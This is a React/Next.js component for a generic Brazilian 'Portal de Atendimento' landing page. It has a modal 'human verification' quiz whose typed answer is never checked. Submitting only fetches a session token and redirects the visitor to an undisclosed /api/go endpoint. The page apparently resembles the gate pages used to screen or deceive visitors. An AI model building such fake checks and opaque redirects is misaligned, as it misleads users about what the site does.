import { useState } from "react";

export default function Quiz() {
  const [answer, setAnswer] = useState("");
  const [loading, setLoading] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(1); // 1: boas-vindas | 2: verificação humana

  // === SUA LÓGICA MANTIDA ===
  const handleSubmit = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/session-token", { method: "POST" });
      const data = await res.json();

      if (data.token) {
        window.location.href = `/api/go?token=${encodeURIComponent(data.token)}`;
      } else {
        alert("Resposta incorreta!");
      }
    } catch {
      alert("Erro no servidor, tente novamente.");
    }
    setLoading(false);
  };

  return (
    <div className="page">
      <main className="center">
        <h1 className="title">Portal de Atendimento</h1>
        <p className="subtitle">Acesse com segurança e agilidade</p>

        <button
          className="cta"
          onClick={() => setModalOpen(true)}
          aria-haspopup="dialog"
          aria-controls="modal-root"
        >
          Consultar agora
        </button>
      </main>

      <footer className="footer">
        <nav className="links">
          <a href="#">Política de Privacidade</a>
          <span className="dot">•</span>
          <a href="#">Termos de Uso</a>
          <span className="dot">•</span>
          <a href="#">Serviços</a>
        </nav>
        <p className="copy">Todos direitos reservados 2025</p>
      </footer>

      {/* Modal */}
      {modalOpen && (
        <div
          id="modal-root"
          className="backdrop"
          role="dialog"
          aria-modal="true"
          aria-labelledby="modal-title"
        >
          <div className="modal popIn">
            {step === 1 && (
              <>
                <h2 id="modal-title" className="modalTitle">
                  Bem-vindo ao portal de atendimento
                </h2>
                <p className="modalText">
                  Para continuar, faremos uma verificação simples.
                </p>
                <button className="primary microTilt" onClick={() => setStep(2)}>
                  Iniciar verificação
                </button>
                <button
                  className="ghost"
                  onClick={() => {
                    setModalOpen(false);
                    setStep(1);
                    setAnswer("");
                  }}
                >
                  Cancelar
                </button>
              </>
            )}

            {step === 2 && (
              <>
                <h3 className="sectionOver">Prova humana para prosseguir</h3>
                <h2 className="question">Quanto é 1 + 2?</h2>

                <input
                  type="text"
                  value={answer}
                  onChange={(e) => setAnswer(e.target.value)}
                  placeholder="Digite sua resposta"
                  className="input"
                />

                <div className="row">
                  <button
                    className="primary microTilt"
                    onClick={handleSubmit}
                    disabled={loading}
                  >
                    {loading ? "Verificando..." : "Prosseguir"}
                  </button>
                  <button
                    className="ghost"
                    onClick={() => {
                      setStep(1);
                      setAnswer("");
                    }}
                  >
                    Voltar
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* GLOBAL RESET to eliminate any white borders/gutters */}
      <style jsx global>{`
        html, body, #__next { height: 100%; }
        * { box-sizing: border-box; }
        body { margin: 0; background: #000; } /* avoids OS-level white flash */
        button, input { outline: none; }
      `}</style>

      <style jsx>{`
        /* Fundo gradiente dinâmico (cores do Brasil) */
        .page {
          min-height: 100dvh;
          display: flex;
          flex-direction: column;
          justify-content: space-between;
          background: linear-gradient(135deg, #009739, #ffd700, #002776);
          background-size: 300% 300%;
          animation: shift 14s ease-in-out infinite;
          color: #ffffff;
          font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
        }
        @keyframes shift {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }

        .center {
          display: grid;
          place-items: center;
          text-align: center;
          padding: 64px 20px;
        }

        .title {
          margin: 12vh 0 8px;
          font-size: clamp(28px, 5vw, 44px);
          font-weight: 800;
          letter-spacing: 0.4px;
          text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
          animation: fadeUp 700ms ease both;
        }
        .subtitle {
          margin: 0 0 28px;
          opacity: 0.9;
          font-size: clamp(14px, 2.2vw, 18px);
          animation: fadeUp 900ms ease both;
        }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        .cta {
          appearance: none;
          border: none;
          cursor: pointer;
          padding: 14px 28px;
          border-radius: 12px;
          background: rgba(255, 255, 255, 0.96);
          color: #0b4d2c;
          font-weight: 700;
          font-size: 16px;
          transition: transform 120ms ease, box-shadow 200ms ease, filter 200ms;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
          animation: pulse 2.2s ease-in-out infinite;
          will-change: transform;
        }
        .cta:hover { transform: translateY(-1px); }
        .cta:active { transform: translateY(0); }
        @keyframes pulse {
          0%, 100% { transform: translateY(0) scale(1); }
          50% { transform: translateY(-1px) scale(1.01); }
        }

        .footer {
          text-align: center;
          padding: 24px 16px 28px;
          line-height: 1.5;
          backdrop-filter: saturate(120%) brightness(1.05);
        }
        .links a {
          color: #ffffff;
          text-decoration: none;
          font-weight: 600;
          position: relative;
        }
        .links a::after {
          content: "";
          position: absolute;
          left: 0; bottom: -2px;
          width: 0%;
          height: 2px;
          background: currentColor;
          transition: width 220ms ease;
        }
        .links a:hover::after { width: 100%; }
        .dot { margin: 0 10px; opacity: 0.85; }
        .copy { margin: 6px 0 0; opacity: 0.9; }

        /* Modal */
        .backdrop {
          position: fixed;
          inset: 0;
          display: grid;
          place-items: center;
          background: rgba(0, 0, 0, 0.45);
          backdrop-filter: blur(2px);
          z-index: 50;
        }
        .modal {
          width: min(92vw, 520px);
          background: rgba(6, 28, 49, 0.22); /* translúcido */
          border-radius: 16px;
          padding: 22px;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
          /* sem borda branca */
          border: none;
        }
        .popIn { animation: popIn 200ms ease-out both; }
        @keyframes popIn {
          from { opacity: 0; transform: scale(0.96); }
          to { opacity: 1; transform: scale(1); }
        }

        .modalTitle {
          margin: 4px 0 8px;
          font-size: clamp(20px, 4vw, 26px);
          font-weight: 800;
        }
        .modalText { margin: 0 0 18px; opacity: 0.95; }
        .sectionOver {
          margin: 2px 0 6px;
          font-size: 13px;
          letter-spacing: 0.6px;
          text-transform: uppercase;
          opacity: 0.9;
        }
        .question {
          margin: 0 0 12px;
          font-size: 22px;
          font-weight: 800;
        }
        .input {
          width: 100%;
          padding: 12px 14px;
          border-radius: 10px;
          border: none;
          outline: none;
          margin: 4px 0 16px;
          text-align: center;
          font-size: 16px;
          background: rgba(255, 255, 255, 0.95);
          color: #043a21;
          transition: box-shadow 160ms ease, transform 120ms ease;
        }
        .input:focus {
          box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.55);
          transform: translateY(-1px);
        }

        .row { display: flex; gap: 10px; flex-wrap: wrap; }

        .primary {
          flex: 1;
          min-width: 160px;
          appearance: none;
          border: none;
          cursor: pointer;
          padding: 12px 18px;
          border-radius: 10px;
          background: #ffd700;
          color: #063d2b;
          font-weight: 800;
          transition: transform 120ms ease, box-shadow 250ms ease, filter 200ms;
          box-shadow: 0 10px 26px rgba(0, 0, 0, 0.25);
          will-change: transform;
        }
        .primary:disabled { opacity: 0.7; cursor: not-allowed; }
        .primary:hover:not(:disabled) { transform: translateY(-1px); }
        .primary:active:not(:disabled) { transform: translateY(0); }

        .ghost {
          flex: 0 1 auto;
          min-width: 120px;
          appearance: none;
          border: 1px solid rgba(255, 255, 255, 0.35);
          background: transparent;
          color: #ffffff;
          cursor: pointer;
          padding: 12px 18px;
          border-radius: 10px;
          transition: background 0.2s ease, transform 0.12s ease;
        }
        .ghost:hover { background: rgba(255, 255, 255, 0.08); transform: translateY(-1px); }
        .ghost:active { transform: translateY(0); }

        /* micro-tilt on hover */
        .microTilt { transform-style: preserve-3d; }
        .microTilt:hover { transform: translateY(-1px) rotateX(1deg) rotateY(-1deg); }

        @media (max-width: 420px) {
          .modal { padding: 18px; }
        }
      `}</style>
    </div>
  );
}
